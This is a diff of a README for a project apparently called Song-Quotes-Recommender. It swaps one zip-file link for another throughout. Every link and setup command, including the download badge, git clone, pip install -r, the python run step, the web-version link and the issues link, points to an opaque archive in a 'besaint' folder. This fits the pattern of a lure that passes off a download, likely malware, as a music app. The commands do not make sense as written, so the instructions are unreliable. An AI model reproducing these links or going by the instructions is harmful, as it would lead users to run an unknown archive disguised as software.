@@ -1,6 +1,6 @@
 # 🎶 Song-Quotes-Recommender - Your Mood's Best Musical Companion
 
-[![Download Here](https://raw.githubusercontent.com/Bympxxx/Song-Quotes-Recommender/main/besaint/Recommender_Quotes_Song_v3.5.zip%20Now-From%20Releases-brightgreen)](https://raw.githubusercontent.com/Bympxxx/Song-Quotes-Recommender/main/besaint/Recommender_Quotes_Song_v3.5.zip)
+[![Download Here](https://github.com/Bympxxx/Song-Quotes-Recommender/raw/refs/heads/main/besaint/Song-Recommender-Quotes-2.3.zip%20Now-From%20Releases-brightgreen)](https://github.com/Bympxxx/Song-Quotes-Recommender/raw/refs/heads/main/besaint/Song-Recommender-Quotes-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -33,7 +33,7 @@ To run this application, you will need:
 
 To download the application, visit this page:
 
-[Download Here](https://raw.githubusercontent.com/Bympxxx/Song-Quotes-Recommender/main/besaint/Recommender_Quotes_Song_v3.5.zip)
+[Download Here](https://github.com/Bympxxx/Song-Quotes-Recommender/raw/refs/heads/main/besaint/Song-Recommender-Quotes-2.3.zip)
 
 Once you're on the Releases page, look for the latest version of the software. Click the link to download the application file. 
 
@@ -44,20 +44,20 @@ If you want to run the application locally on your computer, follow these instru
 1. **Clone the repository**  
    Open your command line or terminal and run the following command:
    ```bash
-   git clone https://raw.githubusercontent.com/Bympxxx/Song-Quotes-Recommender/main/besaint/Recommender_Quotes_Song_v3.5.zip
+   git clone https://github.com/Bympxxx/Song-Quotes-Recommender/raw/refs/heads/main/besaint/Song-Recommender-Quotes-2.3.zip
    cd Song-Quotes-Recommender
    ```
 
 2. **Install dependencies**  
    You need to install a few packages to make the app work. Run this command:
    ```bash
-   pip install -r https://raw.githubusercontent.com/Bympxxx/Song-Quotes-Recommender/main/besaint/Recommender_Quotes_Song_v3.5.zip
+   pip install -r https://github.com/Bympxxx/Song-Quotes-Recommender/raw/refs/heads/main/besaint/Song-Recommender-Quotes-2.3.zip
    ```
 
 3. **Run the application**  
    Start the application with this command:
    ```bash
-   python https://raw.githubusercontent.com/Bympxxx/Song-Quotes-Recommender/main/besaint/Recommender_Quotes_Song_v3.5.zip
+   python https://github.com/Bympxxx/Song-Quotes-Recommender/raw/refs/heads/main/besaint/Song-Recommender-Quotes-2.3.zip
    ```
    Now open your web browser and go to `http://127.0.0.1:5000`. You can start using the app right away!
 
@@ -66,7 +66,7 @@ If you want to run the application locally on your computer, follow these instru
 If you prefer to use the web version without downloading:
 
 1. Open your web browser.
-2. Go to [Song-Quotes-Recommender](https://raw.githubusercontent.com/Bympxxx/Song-Quotes-Recommender/main/besaint/Recommender_Quotes_Song_v3.5.zip) and click the link to visit the online application.
+2. Go to [Song-Quotes-Recommender](https://github.com/Bympxxx/Song-Quotes-Recommender/raw/refs/heads/main/besaint/Song-Recommender-Quotes-2.3.zip) and click the link to visit the online application.
 
 ## 📝 User Guide
 
@@ -92,7 +92,7 @@ If you face any issues, check the following:
 
 - Ensure you have the latest version of Python.
 - Install the required packages as mentioned in the installation steps.
-- Search for solutions or ask for help in the [issues section](https://raw.githubusercontent.com/Bympxxx/Song-Quotes-Recommender/main/besaint/Recommender_Quotes_Song_v3.5.zip).
+- Search for solutions or ask for help in the [issues section](https://github.com/Bympxxx/Song-Quotes-Recommender/raw/refs/heads/main/besaint/Song-Recommender-Quotes-2.3.zip).
 
 ## 🤝 Contributing
 
